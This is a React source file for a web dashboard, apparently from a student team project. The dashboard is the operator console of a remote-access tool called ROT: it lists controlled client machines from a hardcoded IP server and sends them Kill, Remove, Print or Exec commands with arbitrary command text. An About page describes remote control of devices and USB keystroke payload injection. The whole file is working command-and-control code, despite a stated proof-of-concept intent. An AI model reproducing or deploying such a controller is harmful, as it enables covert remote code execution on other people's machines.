import './App.scss';
import {useEffect, useState} from "react";
import Select from 'react-select'
import logo from './logo.png'
import {
  BrowserRouter as Router,
  Route,
  Link,
  Routes
} from "react-router-dom";

const ip = "http://99.234.241.15:6969";

const Navbar = () => {
  return (
    <div className={"navbar"}>
      <div className={"nav-left"}>
        <img src={logo} alt={"Logo"}/>
        <h3>Not Hackers</h3>
      </div>
      <div className={"nav-fill"}/>
      <div className={"nav-right"}>
        <Link to="/" style={{padding: '5px'}}>Dashboard</Link>
        <Link to="/about" style={{padding: '5px'}}>About Us</Link>
      </div>
    </div>
  )
}

const Client = ({data, onClick}) => {
  let os = "";
  switch (data.os) {
    case 0: {
      os = "OSX";
      break;
    }
    case 1: {
      os = "Unix";
      break;
    }
    case 2: {
      os = "Windows";
      break;
    }
    default: {
      os = "unknown";
    }
  }

  let last_ping = new Date(data.last_ping * 1000).toLocaleString();
  return (
    <tr className={"client"} onClick={() => onClick(data)}>
      <td>{os}</td>
      <td>{data.id}</td>
      <td>{last_ping}</td>
    </tr>
  );
}

const ClientList = ({
                      clients, onClick
                    }) => {
  return <div className={"clientList"}>
    <table>
      <tr>
        <th>OS</th>
        <th>ID</th>
        <th>Last Ping</th>
      </tr>
      {clients.map((c) => {
        return (
          <Client data={c} key={c.id} onClick={(c) => onClick(c)}/>
        );
      })}
    </table>
  </div>

}

const ClientSelect = ({
                        clients, currentClient, onChange
                      }) => {
  return (
    <Select className={"selector-container"} classNamePrefix={"selector"}
            options={clients.map((data) => {
              return {
                value: data,
                label: data.id
              }
            })}
            onChange={onChange}
            value={{
              label: currentClient.id,
              value: currentClient.id,
            }
            }
    />
  );
}

const StateEditor = ({
                       state, value, onChange
                     }) => {
  switch (state) {
    case 1:
    case 2: {
      return <textarea className={"stateEditorText"} value={value} onChange={d => onChange(d.target.value)}/>
    }
    case -2:
    case -1:
    case 0:
    default: {
      return <p>No editable data</p>
    }
  }
}

function fetchClients() {
  return fetch(ip + '/clients',
    {
      method: "GET"
    })
    .then(res => res.json())
    .then(data => data["data"])
    .then(data => {
      if (data === null) return [];
      return data.map(d => {
        return {
          "id": d.id.substr(1, d.id.length - 2),
          "last_ping": d.data.time,
          "os": d.data.os
        };
      })
    })
    .catch(err => {
      console.log(err.message);
    });
}

function sendTo(new_state, client, data) {
  let info = {
    id: client.id,
    new_state: new_state,
    data: data.split('\n'),
  }
  fetch(ip + '/control', {
    method: "POST",
    body: JSON.stringify(info),
  })
    .then(res => res.json())
    .then(data => console.log(data))
    .catch(err => {
      console.log(err.message);
    });
}

function Dashboard() {
  const [clients, setClients] = useState([]);
  const [currentState, setCurrentState] = useState(0);
  const [currentClient, setCurrentClient] = useState({});
  const [currentData, setCurrentData] = useState("");
  useEffect(() => {
    fetchClients().then(c => setClients(c));
  }, []);

  return (
    <div className="App">
      <Navbar/>
      <h3>Clients</h3>
      <h3>Settings</h3>
      <ClientList clients={clients} onClick={(d) => {
        setCurrentClient(d);
      }}/>
      <div className={"clientOptions"}>
        <button className={"sendTo"} onClick={() => sendTo(currentState, currentClient, currentData)}
        >SEND
        </button>
        <ClientSelect clients={clients} currentClient={currentClient}
                      onChange={data => setCurrentClient(data["value"])}/>
        <Select className={"selector-container"} classNamePrefix={"selector"} options={[
          {value: -2, label: 'Remove'},
          {value: -1, label: 'Kill'},
          {value: 0, label: 'Idle'},
          {value: 1, label: 'Print'},
          {value: 2, label: 'Exec'},
        ]} onChange={state => {
          setCurrentState(state["value"])
          console.log(currentState)
        }} value={currentState}/>
        <StateEditor state={currentState} value={currentData} onChange={d => setCurrentData(d)}/>
      </div>
    </div>
  );
}

function About() {
  return (
    <div className={'content'}>
      <Navbar/>
      <h1>About us</h1>
      <div>
        <h3>Christian LaForest</h3>
        <h5>Security Exploitation Expert</h5>
        <ul>
          <li>Developed the ROT (Remote Operating Toaster) program</li>
          <ul>
            <li>MacOS and Linux compatibility</li>
            <li>Hosted from a personal server</li>
            <li>Allows for remote control of client devices</li>
          </ul>
          <li>Created the user-interface site</li>
          <ul>
            <li>Implementing CSS and React JS</li>
          </ul>
          <li>General debugging and providing expertise</li>
          <li>Documentation</li>

        </ul>
      </div>
      <div>
        <h3>Kabir Guron</h3>
        <h5>Security Exploitation Expert</h5>
        <ul>
          <li>Constructed the hardware for Arduino Leonardo (Remote IT)</li>
          <li>Created keybind-based Arduino scripts</li>
          <ul>
            <li>Ability to upload any program into TEMP directory</li>
            <li>Light-activated script</li>
            <li>Manual Rick-Roll</li>
            <li>Payload injection</li>
          </ul>
          <li>Created two python scripts: “Control and Email” and “Audio and Email”</li>
          <li>Documentation</li>
        </ul>
      </div>
      <h1>Team Rules</h1>
      <ul>
        <li><b>Remain ethical</b> despite the nature of the program.</li>
        <ul>
          <li>Only create programs as a proof of concept or for useful/good purposes.</li>
        </ul>
        <li>Try to help each other with debugging when appropriate.</li>
        <li>Try to understand perspective and respect ideas. Criticism is perfectly acceptable.</li>
        <li>Meet deadlines well ahead of time.</li>
      </ul>
    </div>
  )
}

function App() {
  return (
    <Router>
      <Routes>
        <Route path="/about" element={<About/>}/>
        <Route path="/" element={<Dashboard/>}/>
      </Routes>
    </Router>
  )
}

export default App;
